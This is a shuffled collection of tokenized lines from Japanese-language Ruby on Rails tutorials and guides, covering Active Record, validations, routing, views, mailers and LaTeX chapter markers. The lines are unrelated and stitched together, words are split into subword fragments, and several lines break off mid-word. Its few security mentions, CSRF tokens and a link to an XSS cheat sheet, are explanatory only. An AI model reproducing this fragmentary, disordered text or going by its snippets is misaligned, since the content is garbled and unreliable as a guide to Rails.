▁\ k ode { find _ by _ email } は 、\ k ode { users } テーブルの \ k ode { email } 属性 に基づいて Active ▁Record が自動的に 生成する メソッドです
▁なお 、` include ?` など を使用して 一意性 をチェックする と 競 合 が発生し やすい ので 注意が必要です 。
▁| ▁| ▁30 7 ▁| ▁: te mp or ary _ redirect ▁|
▁: \ foot note {
▁この オブジェクトを データベースに保存 したい場合は 、 単 に ` save ` を呼び出します 。
▁#### ▁` has _ one ` の オプション
▁この場合 、 パスワード フィールド が 空 である場合 だけ を 扱 います ▟ パスワード の 確 認 フィールド が 空の 場合は 、 確 認 フィールド のバリデーション で 検出 され 、 エラーメッセージ が表示される ので 不要 です ▟ ただし 、 パスワード フィールド と パスワード 確 認 フィールド が 両方 空 だと バリデーション が スキップ されてしまいます 。
▁</ h 2 >
▁ここで 、 Ruby の 関数 には 「\ emph { 暗 黙 の 戻り値 } がある 」 ことにご注意ください ▟ これは 、 関数 内で 最後に 評価 された 式 の値 が自動的に 返される ことを意味します ▁( 訳 注 : ▁ 関数 で 戻り値 を明示的に指定 し なかった場合 の動作 です )▟ この場合 、 引数 の \ k ode { str } が 空 かどうか に応じて 、2 つの メッセージ 文字列 のうち のいずれか を返します 。
▁さらに 、 ▁ _ ユーザー 入力 を 部分 的に 元 にした レスポンス ヘッダ を生成する ときに 、 自分 が 何 を している のか を 正しく 知 っ ておく こと が重要です 。
▁上のコードは 、` _ link _ area ▖ html ▖ erb ` という名前の パーシャル を探し 、` _ gr a y bar ▖ html ▖ erb ` という名前の レイアウト を使用して レンダリング を行います 。
▁{0} 図 7 ▖ 5 {/0} ▁{1} URL ▁ / users /1 ▁ のルーティング は 有効 だ が ページ がない 状態 {/1}
▁def ▁perform ( video )
▁self を省略した 結果を リスト \ ref { code : branch _ no _ raise } に示します 。
▁ 今後 登 場 する スタイル 要素を 利用 できるように するために 、\ k ode { home ▖ html ▖ erb } ビュー に 特別な 要素 をいくつか 追加します ( リスト \ ref { code : signup _ button }) 。
▁#### # ▁` collection ▖ create !(
▁ こういった 場合にも 対応 できるように する ため 、 リスト \ ref { code : micropost _ model _ image _ validation } で実装した サーバー 側 のバリデーション も 重要な のです 。
▁Users リソース 追加 後 の の ユーザー表示ページ
▁Inde x ▁Co nd : ▁( id ▁= ▁1)
▁上のように することで コードの 意味 が わかりやすく なり 、\ k ode { about \_ path } の定義 を 変 え れば \ k ode { about \_ path } が 使用されている すべての URL を変更 できる ため 、 柔 軟 性 が 高 まり ます 。
▁gem 設定ファイル を作成する 。
▁ 条件 は ハッシュ を使用して 指定することもできます 。
▁" csrf - param " メ タ タグ と " csrf - token " メ タ タグを返します ▟ これらの 名 称 は それぞれ 、 ク ロスサイトリクエストフォージェリ ▁( CSRF : ▁ cross - site ▁request ▁for eg er y ) ▁ の パラメータ と トークン が 元 になっています 。
▁belongs _ to ▁: representative
▁ したがって 、 Microposts の リソース は リスト \ ref { code : microposts _ resource } のようになります 。
▁> > ▁@ foo ╼ ▁=> ▁nil ╼ ▁> > ▁@ foo ▁= ▁@ foo ▁|| ▁" bar " ╼ ▁=> ▁" bar " ╼ ▁> > ▁@ foo ▁= ▁@ foo ▁|| ▁" baz " ╼ ▁=> ▁" bar "
▁Rails アプリケーションの 実行 は 、 アプリケーションのルート ディレクトリ ( ` / ` など ) で 行なう ことが 前提と なっています 。
▁ パス や URL を生成する こともできます 。
▁`: instance _ accessor ` オプションを ` false ` に 設定 すれば 、 どちらの インスタンス メソッド も 生成 されません 。
▁Cucumber を使用すると 、 アプリケーションの 振る舞い を テキスト ベースの 「\ emph { ストーリー }」 で 定義 することができます 。
▁this
▁Action ▁Mailer は Active ▁Job と うまく 統合 されているので 、 Web の リクエスト / レスポンス サイクル の 外 で 非同期 に メールを送信 できます ▟ この おかげで 、 ユーザーは 送信 完了 を 待 つ 必要がありません 。
▁ データ をデータベースに保存する 前に バリデーション を実行する 方法は 、 他にも データベース ネイティブ の 制 約 機能 、 クライアント側 で のバリデーション 、 コントローラ レベル のバリデーション など 、 多くの 方法があります 。
▁このとき に \ k ode { user } が \ k ode { nil } であれば 、1 番目の 条件 式 で 評価 は 終 了 する のですが 、 実際には nil では ないので 、\ emph { 2 番目の } 条件 式 まで 評価 が 進 み 、 その ときに エラーが発生し ます 。
▁ 個 別の 属性 を検証する ための カスタム バリデータ を追加する には 、` ActiveModel :: Each Validator ` を使用する のが 最も 簡 単 で 便利です 。
▁# ▁If ▁the ▁collection ▁has ▁been ▁loaded ▁( コレクション が 読み込まれる と )
▁# ▁=> ▁" user %5 B id %5 D = 89 & user %5 B name %5 D = John + S m i th "
▁Users コントローラに \ k ode { following } アクションと \ k ode { followers } アクション を追加する
▁ ERB テンプレート の 内部で は 、` < % ▁%> ` タグ や ` <%= ▁%> ` タグ に Ruby コード を含め ることができます 。
▁続いて 、 クラウド ホスティング プロ バ イ ダ ー が提供する CDN サービス と 契 約 を 結 ぶ 必要もあります 。
▁上の 例 にも 示 されている ように 、 増 分 値 には 負 の 数 も 指定 できます 。
▁ 1234567890▖50 6 ▖ to _ s (: currency ) ▁# ▁=> ▁$ 1, 2 34 , 5 67 , 89 0▖5 1
▁{0} 図 1 ▖ 3 {/0} ▁{1} デフォルトの Rails ページ ▟\ href { http :// railstutorial ▖ org / images / figures / riding _ rails _4_0 - full ▖ png }{( 拡大 ) }{/1}
▁` alias _ method _ chain ` メソッドを使用すると 、 上のような パターン を簡単に 行えます 。
▁それでは 、 もう一度 {0}{1} リスト 4 ▖ 1 {/1}{/0} に 戻 り 、 レイアウト に ▁CSS ▁( c ascad ing ▁style ▁ sheet ) ▁ を追加する 以下の行 を見てみましょう 。
▁image _ path (" edit ▖ png ") ▁# ▁=> ▁ / assets / edit - 2 d 1 a 2 db 6 3 f c 7 38 6 9 00 2 1 fe db 5 a 6 5 b 6 8 e ▖ png
▁ ブラウザは ネイティブ では \ text tt { DELETE } リクエストを 送信 できない ため 、 Rails では JavaScript を使用して これを 偽 造 します 。
▁\ k ode { new } フォーム と \ k ode { edit } フォーム を パーシャル 化 する
▁` none ` メソッドは 、 連 鎖 ▁( chain ) ▁ 可能な リレーション を返します ▁( レコード は 返 しません ) 。
▁さらに 、 この 「 失敗 - 実装 - 成功 」 という 開発 サイクル は 、 「\ href { http :// en ▖ w ikipedia ▖ org / wiki / F low _ ( p sy ch o log y )} { フ ロー 体 験 }」 を 誘 発 します ▟ フ ロー に 入 ること で 、 コーディング が 楽 しく なり 、 開発 の 生 産 性 も 向上 します 。
▁ テーブル を結合する
▁# ▁ 新しい アセットパイプライン で 必要
▁< li > <%= ▁user ▖ name ▁%></ li >
▁リスト \ ref { code : user _ model _ forget } のコード を使用すると 、 永 続 セッションを 終 了 できるように なる 準備 が 整 います ▟ 終 了 するには 、\ k ode { forget } ヘルパーメソッド を追加して \ k ode { log \_ out } ヘルパーメソッド から 呼び出し ます ▁( リスト \ ref { code : log _ out _ with _ forget }) 。
▁author s ▖ compact !
▁ 実際には 、 これ に 非常に 近 い \ k ode { flash ▖ now } を使います が 、 本当に 必要 になる まで は 使わない ように し よう か と思います 。
▁ スタック 全体 を 考 慮 に 入 れ れば 、 振る舞い の 変 化 する は あ ち こ ち に 見 つ か ります ▟ ` ActionView :: Helpers :: AssetTagHelper # image _ tag ` など が 典 型 です 。
▁ 統合テスト を使う ことで 送信 フォームの 振る舞い を 検証 したり 、 バグ の 発生 を 検 知 したり できる
▁` respond _ with ` および クラス レベル の ` respond _ to ` メソッドは 、` respond ers ` ▁gem に 移 転 しました 。
▁ 属性 に関連する エラー が ない場合は 空の 配列 を返します 。
▁$ ▁rails ▁destroy ▁model ▁ Foo
▁{0} 図 5 ▖ 4 {/0} ▁{1} スペース や 共通 スタイル を追加した 結果 {/1}
▁もし Rubular の サービス が 便 利 だと 思 った ら 、 素晴らしい 功 績 を 残 した 開発者 である \ href { http :// bit ▖ ly / d on ate - to - rubular } { Michael ▁L o v i tt } さ ん に 報 い るために \ href { http :// lo v i tt ▖ net /}{ Rubular への 寄 付 } を お勧め します ▖ 。
▁ モデルの 属性 には 、 リ ー ダ ー ▁( reader ) 、 ラ イ ター ▁( writer ) 、 述 語 ▁( predicate ) ▁ があります 。
▁#### ▁ メイラー を作成する
▁ こうすることで 英語 に 近 い 自然な 表 記 が 可能 になり 、 さらに コンパクト になります
▁invoke ▁helper
▁ フィールド の ラベル を作成します 。
▁### ▁ Product ion ログ の レベル
▁validates ▁: term s _ of _ service , ▁ acceptance : ▁ { ▁accept : ▁' y es ' ▁ }
▁ 関連付け を作成する と 、 モデルに その 名前 の メソッド が追加され ます ▟ 従って 、` ActiveRecord :: Base ` のインスタンス で 既に 使用されている ような 名前 を 関連付け に使用する のは 禁 物 です 。
▁この場合 、` destroy ` ▁( ` / photos / : id ` への ` DELETE ` リクエスト ) ▁ を除いて 通常の ルーティング が生成されます 。
▁password _ digest : ▁" $ 2 a $ 10 $ A 58 / j 7 w w h 3 a A f f G k M A O 9 Q ▖ j j h 3 js h d ▖ 6 a k h ▖▖▖"
▁< option ▁value =" 2 "> Sam </ option >
▁ ファクトリー の シ ー ケ ン ス という 考え を 応用 して 、 テスト 用に 30 人のユーザー を作成します ▟ ページネーション を行う には これで 十分です 。
▁ 基本的な 手順 は 次のようになります 。
▁<%= ▁form _ tag ( { action : " post " }, ▁ multipart : ▁true ) ▁do ▁%>
▁ アカウント有効化 機能 と パスワード再設定の 機能 が追加された ことで 、 ついに サンプルアプリケーションの 登録 、 ログイン 、 ログアウト 機能 がすべて 本 格 的に 実装 完了 しました 。
▁Rails ▁API サイトの \ k ode { ActiveRecord :: Base } の 項 を 読み 通 し 、 どんな ことができる か を 把 握 してください 。
▁ ここ から お わ か り だ と思います が 、 Cucumber は RSpec と同様 Rake タスク から 呼び出す こともできます 。
▁\ k ode { "2013-0 3- 11 ▁00:57:46" } という タイムスタンプ が 気 になった 方 も い る と思います が 、 著者 はこの 箇所 を 真 夜 中 過 ぎ に 書いた わけではありません ▟ 実は この タイムスタンプ は \ href { http :// en ▖ w ikipedia ▖ org / wiki / Co or d in at ed _ U n ivers al _ Time } { 協 定 世界 時 ▁( UT C )} ▁ に合わせて あります ▟ これは \ href { http :// en ▖ w ikipedia ▖ org / wiki / Green w ic h _ M e an _ Time } { グ リ ニ ッ ジ 標準 時 ▁( G M T )} ▁ と同様 、 標準 時間 として 使用されます 。
▁ ec tion ▁blocks ▁( end )╼╼ ╼ ▁% ▁subsection ▁arrays _ and _ range s ▁( end )╼╼ ▁\ subsection { ハッシュ と シンボル } ▁% ▁( fold )╼ ▁\ label { sec : hashes _ and _ symbols }╼╼
▁この 一 行 メソッドは 、 単 に \ k ode {@ current _ user } インスタンス変数 を設定し 、 後に 使用 するために ユーザーを 効率 よく 保存 します 。
▁ 皆 様 の 期待どおり 、 Rails には このような 手 続 き を簡単に 行う ための 方法があります ▟ 多 対 多 の関係 を表現する この手法は \ k ode { has _ many ▁through } として 知 ら れ ています 。
▁run ▁bundle ▁install
▁(\ k ode { default : ▁false } 引数 を与え ない場合 、 ▁\ k ode { admin } の値 はデフォルトで \ k ode { nil } になります が 、 これは \ k ode { false } と同じ 意味 です ので 、 必ず し も この 引数 を与える 必要はありません 。
▁flash をテストする ための テンプレート
▁select _ tag ▁" people ", ▁"< option > David </ option > "
▁User モデルと Micropost モデル をそれぞれ {0}{1} リスト 2▖1 0 {/1}{/0} と {2}{1} リスト 2▖1 1 {/1}{/2} のように 更新 することで この 関連付けを 表現 できます 。
▁この エンジン は ブログ 機能を ホスト アプリケーション に追加し 、 記事 と コメント を作成 できます 。
▁ 次は 、 ユーザーが 自分の プロフィール 情報を 編集 できるように する 予定です ▟ これは {0} 第 {1} 9 {/1} 章 {/0} の 最 終 目 標 で もあります 。
▁"#{ data } !"
▁User ▖ where ( id : ▁1) ▖ includes (: articles )▖ explain
▁* ▁` to _ prepare `: ▁これは 、 Railtie s 用の イニシャライザ と アプリケーション 自身 用の イニシャライザ がすべて 実行 された 後 、 かつ 事前 一括読み込み ( eager ▁loading ) の実行 と ミドルウェアスタック の 構 築 が 行われ る 前に 実行されます ( 訳 注 : ▁ Railtie s は Rails の コア ライブラリ の 1 つ で 、 Rails ▁ Util it ies の も じ り です ) 。
▁Rails には セキュリティ の高い アプリケーションを開発する の に 便利な 機能 が 多数 あり 、 ここでは その 機能 に 引 っ か か った のです 。
▁ 整 数 のみ に マッチ させ たい場合は 、`: only _ integer ` を true に します 。
▁ エンジンの 基本 クラスは ` lib / blorgh / engine ▖ rb ` の中に あります 。
▁render ▁file : ▁"/ path / to / rails / app / views / books / edit ▖ html ▖ erb "
▁以下の 機能 は ど れ も 難 易 度 が それ なり に 高い ので 、 実装 に 必要となる か もし れ ない ツール について の ヒント も 書 いて お きました 。
▁リスト \ ref { code : user _ model _ password _ reset } で パスワード再設定の メールを送信 する コードは 、 以下の 部分 です 。
▁d { code }╼\ end { code listing }╼╼ ╼\ subsection { ルーティング の設定 } ▁% ▁( fold )╼\ label { sec : set ting _ the _ root _ route }╼╼
▁` render ` メソッド に対する 呼び出し では 、 一般に 以下の 4 つの オプション が 使用できます 。
▁ データベースに \ k ode { password _ digest } カラム を 置く という 条件 さ え 守 れば 、 上の メソッドを モデル に追加する だけで 新規ユーザー の作成 と 認 証 を セキュア に することができます 。
▁` prev _ quarter ` は ` last _ quarter ` の別名 です 。
▁< h 1> Listing ▁ Book s </ h 1>
▁\ k ode { user } を 紐 付け て 能動的関係 を作成 / 登録 する ▁( 失敗 時に エラーを 出力 )
▁この節では 、\ emph { ステータスフィード } ▁({1}{2} 第 12 章 {/2}{/1} で 完成させます ) ▁ の最初の ヒント をお見せします 。
▁最後に 、 Web から 更新 できる 許可 リスト に \ k ode { picture } 属性 を追加しましょう 。
▁Rails ▁4▖0 から は 、` delete ` メソッドを使用すると 、 与えられた ID に マッチする レコードを 自動的に 探 す ようになりました 。
▁この \ emph { 順序 リスト } タグ \ k ode { ol } を含む コードが マイクロポストの 一覧 を生成します ▟ ただし ご 覧 のとおり 、 実装 の 厄 介 な 部分を マイクロポスト パーシャル に 任 せ ています 。
▁before フィルター に \ k ode { logged \_ in \_ user } を追加する
▁# ▁2▖ o d d ?
▁たとえば 、1 回 に 5 000 件 ずつ 処理 したい場合は 以下のように 指定します 。
▁@ url ▁= ▁' http :// example ▖ com / login '
▁\ ref { sec : account _ activations _ resource } で実装した 有効化 メール が 配信 される はずです ▁( 図 \ ref { fig : activation _ email _ production }) 。
▁なお 、 必要な gem は ここ まで で すべて インストール した ので 、 今後 の 章では 新 た な gem は 追加 しません 。
▁@ order _ id s ▁= ▁@ customer ▖ order _ id s
▁{0}{1} 第 8 章 {/1}{/0} の 認 証 ▁( authentication ) ▁ システム を使えば 、\ emph { before _ action } を使用して これを 行えます 。
▁ここで 記事 を 新規 作成 しようとすると 、 以下のような B A S I C ▁ http 認 証 ダ イ ア ログ が表示されます 。
▁ ログイン して ユーザーを 保 持 する
▁ Cache - Control : ▁public , ▁ max - age = 25 92 000
▁ ルーティング を定義し たので 、 統 計 情報 の パーシャル を実装する 準備が整いました ▟ この パーシャル では 、 div タグ の中に 2 つの リンク を含め る ようにします ▁( リスト \ ref { code : stats _ partial }) 。
▁最初の 例 では 、 複数の ルーティング で 同じ 名前 を使用し ない ように すれば 回 避 できます 。
▁" digest ":" a 9 c 64 1 b f 2 b 8 1 f 04 76 e 87 6 f 7 c 5 e 37 59 6 9 " }, " my _ image - 23 1 a 6 80 f 2 38 87 d 9 d d 7 07 10 ea 5 e fd 3 c 6 2▖ png ":{" logical _ path ":" my _ image ▖ png "," m time " : "2013-0 7-2 6 T 23 :00 : 27 - 07 :00 "," size " : 6 64 6 ,
▁Article ▖ where ( trashed : ▁true )▖ re where ( trashed : ▁false )
▁ ユーザー情報 を編集する パターン は 、( {0}{1} 第 7 章 {/1}{/0} ) の 新規ユーザー の作成 と 極めて 似 通 っています 。
▁ ある カラム を削除する ような 不可 逆 な マイグレーション の場合は 、\ k ode { change } メソッド の代わりに 、\ k ode { up } と \ k ode { d own } の メソッドを 別 々 に 定義 する必要があります 。
▁t ▖ integer ▁: credit _ r ating
▁JavaScript が 動かない ブラウザの サポート が必要な場合は 、`: authenticity _ token ▁=> ▁true ` を フォーム オプション として 渡す か 、 この 設定 を ` true ` に します 。
▁ ec tion ▁a _ user _ object ▁( end )╼╼ ▁% ▁section ▁ ruby _ classes ▁( end )╼╼ ▁\ section { 最後に } ▁% ▁( fold )╼ ▁\ label { sec : co nclusion }╼╼
▁従って 、 インスタンス から クラス 属性 を変更する ことは できます が 、` class _ attribute ` で 行われ るように 上書き する ことはできません ( 上 記 参 照 ) 。
▁この ルーティング を 反 映 したものを リスト \ ref { code : sessions _ resource } に示します ▟ なお 、\ k ode { rails ▁generate ▁controller } で生成された 不要な ルート は 、 この リスト から 削除 して あります 。
▁is ▁wrong ▖
▁しかし Rails チーム は この種の メソッド に依存し て 欲 しく ない と 考え ています 。
▁# ▁config / initializers / secret _ token ▖ rb
▁しかし 今回の ように ▁“ 1 ▁microposts ” ▁ と 表示 してしまう と 英語 の 文法 上 誤り になっ てしまう ので 、\ k ode { pluralize } メソッドを使用して ▁“ 1 ▁micropost ” ▁ や ▁“ 2 ▁microposts ” ▁ と 表示する ように 調 整 します 。
▁ 送信 画像 を表示します ▟ この 画像 を クリック すると フォーム が 送信されます 。
▁d ▖ advance ( seconds : ▁1) ▖ advance ( months : ▁1)
▁たとえば 、 フォロー 用 フォーム 全体 を \ k ode {" foobar "} という 文字列 で 置き換え る には 、 以下 を使用します 。
▁これ を使用して 、 メール が 配信 エ ー ジ ェ ン ト に 最終的に 渡される 直前に メール の内容を 変更 するための イン ター セ プ タ を 登録 することができます 。
▁ ファイル サイズ に対する バリデーション ▁(\ ref { sec : image _ validation }) ▁ は うまく い きました が 、 画像 サイズ ▁( 縦 横 の長さ ) ▁ に対する 制限 は ないので 、 大 き すぎる 画像 サイズ が アップロード される と 図 \ ref { fig : large _ upload ed _ image } のように レイアウト が 壊 れ てしまいます 。
▁#### ▁ その他の 拡張
▁この節では 、 RSpec ▁gem によって 提供され る \ k ode { rspec } コマンド を使って テスト を実行します 。
▁ と り あ え ず 動く フィード の実装
▁* ▁Rails ▁4▖0 の Action ▁Pack から Action と P age の キャッシュ 機能 が 取り 除 か れ ました 。
▁< h 1> Edit ing ▁ zone </ h 1>
▁# ▁< a ▁type =" integer "> 1 </ a >
▁ INNER ▁JOIN ▁tags ▁ ON ▁tags ▖ article _ id ▁= ▁articles ▖ id
▁< em > emph a size d </ em >
▁これは 、 デザイン パターン で言う decorator パターン として 実装 する のが普通です 。
▁user ▖ save
▁te }╼╼ ▁% ▁subsection ▁a _ users _ resource ▁( end )╼╼ \ subsection { デ バ ッ ガ ー } ▁% ▁( fold )╼\ label { sec : debugger }╼╼
▁User モデルに パスワード 再設定 用 メソッド を追加する
▁\ k ode { microposts } テーブルに は \ k ode { user \_ id } カラム を作成して あった ので 、 それによって Rails と Active ▁Record が マイクロポスト と ユーザーを 関連付け る ことができる ようになっています 。
▁デフォルトは ` false ` です 。
▁* ▁` ENV [" RAILS _ RE LA T I V E _ URL _ ROOT "] ` は 、[ アプリケーションを サブディレクトリ にデプロイする ]( configuring ▖ html # サブディレクトリ にデプロイする - 相 対 url ルート の使用 ) ときに ルーティング システム が URL を 認 識 するために使用されます 。
▁create _ table ▁: assemblies _ part s , ▁id : ▁false ▁do ▁| t |
▁ 他の フォーム 内の コードを 置き換え る パーシャル 内で の ` form _ for ` 宣言 が このように 短 く て 簡潔 で 済 む のは 、 `@ article ` が RESTful ルーティング の 完全な セット に対応する ▁** リソース ** ▁ であり 、 必要な URI と メソッドを Rails が それ に基いて 推 測 できる からです 。
▁ サインイン した ユーザーが これらの アクションを ブラウザで 開 こう と したら 、 ルート URL に リダイレクト するようにしてください 。
▁* ▁` load _ active _ support `: ▁Active ▁Support の 基本 部分 を設定する ` active _ support / dependencies ` が必要です 。
▁id = \ text tt {1} の ユーザーを削除する アクション
▁* ▁ エンジンの ビルド 機能
▁これは 、 静的なページ の 集合 に対して は 、 適切な アクションと 言えます ▟ 言い 換 え ると 、 REST アーキテクチャ は 、 あらゆる 問題 に対して 最適な 解決 方法 である とは 限 らない ということです 。
▁ といった 前 置 if 文 に 変 わ っています ▁( 訳 注 : ▁1 行 のとき は 後 置 if 文 、2 行 以上の ときは 前 置 if 文 を使う のが Ruby の 習慣 です ) 。
▁ 管理者 が 削除 リンクをクリックすると 、\ text tt { DELETE } リクエストが \ k ode { destroy } アクションに 向 け て 送信 され 、 該当する ユーザーが 削除 される
▁ months _ ago
▁{0} 図 1 ▖ 4 {/0} ▁{1} アプリケーション 環境 が表示されている デフォルト ページ ▟\ href { http :// railstutorial ▖ org / images / figures / riding _ rails _ environment _4_0 - full ▖ png }{( 拡大 ) }{/1}
▁ 使用している テキストエディタ が この ようになってい ない場合 、 テンプレート を表示する 時に é などの 特 殊 文字 が ◆ ? のような 感じ で ブラウザで 表示される ことがあります 。
▁#### ▁` render ` の オプション
▁ 詳細は {0}{1} 第 7 章 {/1}{/0} でも 説明します が 、 上で 見た ように モデルの 生成 と 保存 を 2 つの ステップ に分け ておく と 何か と 便利です ▟ しかし 、 Active ▁Record では \ k ode { User ▖ create } で モデルの 生成 と 保存 を 同時に お こ な う 方法 も 提供され ています 。
▁以下の例 で説明します 。
▁Rails では 、 変更を プッシュ する 時に テストスイート を フル 実行する という 慣習 がある わけではありません 。
▁{0} 表 11 ▖2{/0} ▁{1} Microposts リソース が提供する リスト \ ref { code : microposts _ resource } の RESTful ルート {/1}
▁ コントローラ で定義した \ emph { インスタンス } 変数 に テストの 内部 から アクセス するには 、 テスト 内部で \ k ode { assigns } メソッドを使用します ▟ このメソッド には インスタンス変数 に対応する シンボル を 渡します 。
▁これ に対応する アカウント有効化 リンク の ベース URL は以下のようになります 。
▁\ href { http :// guides ▖ rubyonrails ▖ org /}{ Rails ▁Guides } : ▁ トピック 毎 に 分 類 された 最新の ▁Rails ▁ リ フ ァ レ ン ス
▁この コマンド を実行すると 、 4 つの ファイル が生成されます 。
▁ 注 : ▁このオプション は ▁“ remember ed ▁option ” ▁ と呼ばれる もの で 、 この オプションを 一度 実行する と コマンド に保存 され 、 今後 Bundler を実行する ときに オプションを 追加 する必要が なくなります 。
▁encoding : ▁ utf 8
▁# ▁== ▁ Schema ▁In form ation
▁これ を修正する 方法 のひとつ は 、 render を redirect に 変更 することです 。
▁Ruby では 、 あらゆる もの が \ k ode { オブジェクト } です ▟ 文字列 や \ emph { nil } です ら オブジェクト です 。
▁### ▁Rails テンプレート の ` after _ bundle `
▁上のように 宣言 しておく と 、 `@ employee ▖ s ub or d in ate s ` と `@ employee ▖ manager ` が 使用 できるようになります 。
▁invoke ▁scaffold _ controller
▁` prepare d _ state ment s ` を ` false ` に設定する ことで P repared ▁Statements をオフに できます 。
▁このガイドでは 、 Active ▁Record のバリデーション ▁( 検証 : ▁validation ) ▁ 機能 を使用して 、 オブジェクトが データベースに保存 される 前に オブジェクト の状態 を検証する 方法 について説明します 。
▁\ chapter { To y アプリケーション } ▁% ▁( fold )╼\ label { cha : a _ toy _ app }╼╼
▁Article ▖ where ( published : ▁true )▖ any ?
▁* ▁[ 優 れ た セキュリティ ブログ ]( http :// ha ▖ c k ers ▖ org / blog / ) には [ XSS チ ート シ ート ]( http :// ha ▖ c k ers ▖ org / x s s ▖ html ) が 掲 載 されています 。
▁self を省略した 結果を リスト \ ref { code : current _ user _ working } に示します 。
▁ 私 自身 、 章 の 終わり にある 練 習 問題 も や り ながら 、 この ▁\ emph { Rails ▁ チュートリアル } を 3 日 間 かけて 一 気 に 読 破 しました 。
▁# ▁Return s ▁true ▁if ▁the ▁collection ▁is ▁empty ▖ ▁( 訳 : コレクション が 空 なら true を返す )
▁#### ▁` render ` と ` redirect _ to ` の違い
▁ private
▁ 引数として 指定された ソース にある スタイルシート へのリンク タグを返します 。
▁#### ▁ ネストした 関連付け ハッシュ
▁# ▁ メ モ : ▁a ▁@ person 変数 は コントローラ 側 で 設定 済み である と する ▁ (@ person ▁= ▁Person ▖ new など )
▁Active ▁Record には 2 とおり の ロック 機 構 があります 。
▁たとえば 以下のコード の場合 、
▁上のコード は以下のようになります 。
▁ここまで で Web サイトの 認可 機能 は 完成 した か のように 見え ますが 、 後 1 つ 小さな キ ズ があります ▟ 保 護 された ページ にアクセス しようとすると 、 問 答 無 用 で 自分の プロファイル ページに 移動 させ ら れ てしまいます 。
▁class ▁ Order ▁< ▁ActiveRecord :: Base
▁| ▁GET ▁| ▁ / photos / new ▁| ▁photos # new ▁| ▁new _ image _ path ▁|
▁2 番目の 方法 は次のとおりです 。
▁self ▖ primary _ key ▁= ▁" person _ id "
▁# ▁ 日付 の 指定 がない場合 、 本 日 を デフォルト値 と する 日付 セレクト ボックス を生成する
▁image _ tag (" icon ▖ png ") ▁# ▁=> ▁< img ▁src ="/ assets / icon ▖ png " ▁ alt =" I con " ▁/>
▁#### ▁` camelize `
▁\ href { http :// a w s ▖ a mazon ▖ com / ia m /}{ A W S ▁I d entity ▁and ▁Access ▁ Management ▁( I A M )} で ユーザー を作成し 、 A cc ess キー と S ec re t キーを メ モ する
▁" foo "▖ duplicable ?
▁: discount _ cannot _ be _ greater _ than _ to t al _ value
▁この ジェネレータ によって 生成される もの はすべて 正しく 名前空間化され ます 。
▁` symbolize _ keys ` メソッドは 、 レシーバの ハッシュ キーを シンボル に変換 した ハッシュ を返します 。
▁ アプリケーション から エンジンの 機能 にアクセス できるように するには 、 エンジン を アプリケーションの ` config / routes ▖ rb ` ファイル で マウント する必要があります 。
▁date ▖ end _ of _ day ▁# ▁=> ▁Mon ▁Jun ▁ 07 ▁ 23:59:59 ▁+0200 ▁2010
▁これらの 使用 法 については この すぐ 後で 解説します 。
▁\ ref { sec : static _ pages } で 、 最初の コントローラ である StaticPages コントローラ を作成し ました 。
▁ アップグレード の 実 施 は 、 テスト カ バ レ ッ ジ を き ち ん と 準備 してから 行なう よう 、 お 願 い いた します 。
▁たとえば 、 {0}{1} 図 1 ▖ 5 {/1}{/0} を もう一度 見 てみると 、 コードを 80 文字 以下 に 抑 え るため の 小さな 縦 線 が 右 側 に見えます 。
▁# right _ menu ▁ { float : ▁right ; ▁background - color : ▁ y ellow ; ▁ color : ▁b la c k }
▁[ remember ▁me ] ▁ 機能 は既に 快 調 に 動作 しています が 、 ここで 終 わ ら せずに テストを ちゃんと 書き 、 動作を テストで 確 認 できるように しておくこと が重要です 。
▁ サイト リンク の ルート ▁( routing ) ▁ と URL の マッピング
▁ レシーバ ー の キー を直接 文字列 化 する 破壊的な ` stringify _ keys !` もあります 。
▁\ ref { sec : remember _ me _ checkbox } では 、 現在の アプリケーション 設計 では 、 リスト { p 2 } の 統合テスト で 仮 想 の {3} remember _ token {/3} 属性 にアクセス する手段 がない ことを 説明しました 。
▁def ▁ welcome
▁ この章 で作成した To y アプリケーション には 良い ところ もあります が 、 さまざまな 弱 点 もあります 。
▁ これはリスト \ ref { code : demo _ users _ controller } で使用されていました 。
▁ レイアウト の 最後の 部分 は 、 メ イン コンテンツ 用の \ k ode { div } です 。
▁require ▁' other _ engine / engine '
▁Rails には ` form _ for ` という ヘルパーメソッド があり 、 主 に これ を使用して フォーム を作成します 。
▁ 開発 の 経験 がない 方 にとって は 相 当 な 驚 き だ と思います が 、 仕 事 の 道 具 である \ emph { 開発 ツール の 学習 に 時間 を かけ ること は いた って 普通 の 事 } であり 、
▁今回の場合 、\ k ode { full \_ title } ヘルパーは サイトの すべての ページ で使用する ことを 前 提 に しています が 、 Rails には このような 場合 のための 特別な ヘルパー ファイル \ k ode { app / helpers / application \_ helper ▖ rb } があります 。
▁たとえば 、 " one " から " f our " まで の 4 つの イニシャライザ があり 、 かつ この 順序 で 定義された とします ▟ ここで " f our " を " f our " より ▁ _ 前 _ ▁ かつ " th re e " よりも ▁ _ 後 _ ▁ になるように 定義 すると 論 理 矛盾 が発生し 、 イニシャライザ の実行 順 を 決定 でき なくなってしまいます 。
▁ _ app _ setup ▁( end )╼╼ ▁\ section { 静的ページ } ▁% ▁( fold )╼ ▁\ label { sec : static _ pages }╼╼
▁ すべての HTML 要素 には 、 クラス と \ emph { id } の両方 を指定することができます ▟ これら は単なる ラベル で 、 CSS で スタイル を指定する ときに 便利です ▁(\ ref { sec : custom _ css }) 。
▁=> ▁#< User : 0 x 22 4 ce ec ▁@ email = nil , ▁@ name = nil >
▁[ Show ▁hidden ▁files ] ▁ を 選択 して 、 アプリケーションのルート ディレクトリ にある \ k ode { ▖ gitignore } ファイル を表示します ▁( 図 \ ref { fig : show _ hidden _ file s }) ▖
▁次に 、 サンプルユーザー を作成する Rake タスク を追加します 。
▁それでは 、\ k ode { home ▖ html ▖ erb } ビューの コードを 、 {1} {2} リスト 3▖2 8 {/2}{/1} のように 、 タイトル に含まれる " Home " という文字 を 置き換え 、 動作を 確認し ましょう 。
▁put ▁: update _ name , ▁on : ▁: member
▁\ k ode { index } アクションに \ k ode {@ users ▁= ▁User ▖ all } という 行 があります ▁( 図 2▖1 1 ▁ の 3 に相当 )▟ これによって 、 User モデル から すべての ユーザーの 一覧 を取り出し ▁( 4 ) 、\ k ode {@ users } という 変数 に保存 します ▁( 5 )▟ なお 、 @ users は 「 あ っ と ▁ ゆ ー ざ ー ず 」 と発音します 。
▁a 2▖ x ▁= ▁2
▁ BigDecimal ▖ new ( 5▖0 0, ▁6 )▖ to _ formatted _ s ▁# ▁=> ▁" 5▖0 "
▁最初に 、 この フィード で 必要な クエリ について 考え ましょう 。
